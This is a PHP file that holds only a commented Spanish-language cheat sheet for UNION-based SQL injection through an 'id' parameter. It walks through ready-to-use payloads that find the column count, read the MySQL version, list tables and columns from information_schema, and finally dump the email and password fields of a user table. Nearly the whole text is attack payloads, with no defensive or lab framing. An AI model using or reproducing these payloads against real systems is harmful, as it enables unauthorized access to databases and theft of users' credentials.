<?php
/*
"INSERTANDO CODIGO SQL"

/------- COMPARAR CAMPOS --------/
// union select: busqueda para machear dos tablas(empatarlas o unirlas sin que tengan relacion)
id= -1 UNION SELECT ALL 1,2,3,4
//nos dara error
id= -1 UNION SELECT ALL a,b,c,d

/------- AVERIGUAR VERSION DE php -----/
//en el 3er campo nos muestra la version de mysql que esta usando el sistema
id= -1 UNION SELECT ALL 1,2,@@VERSION,4

/------- AVERIGUAR NOMBRE DE LA BD Y SUS TABLAS ------/
// en el CAMPO 2 averiguamos el nombre de las tablas y en el CAMPO 4 el nombre de la bd de cada tabla
id= -1 UNION SELECT ALL 1,group_concat(table_name),3,group_concat(table_schema)+from+information_schema.tables+where+table_schema=database()

/------- AVERIGUAR LOS CAMPOS o COLUMNAS DE UNA TABLA ------/
// traemos las columnas de la tabla persona
id= -1 UNION SELECT ALL 1,group_concat(COLUMN_NAME),3,4+from+information_schema.COLUMNS+where+table_schema='nombreDeTuBD'+and+TABLE_NAME='persona'

/------- AVERIGUAR VALORES DE UN CAMPO ------/
// traemos la informacion guardada en los campos email y pass de la tabla persona
id= -1 UNION SELECT ALL 1,2,3, group_concat('<br> <b>User: </b>',email,' <b>Pass:</b>',pass)+from+persona

*/
?>
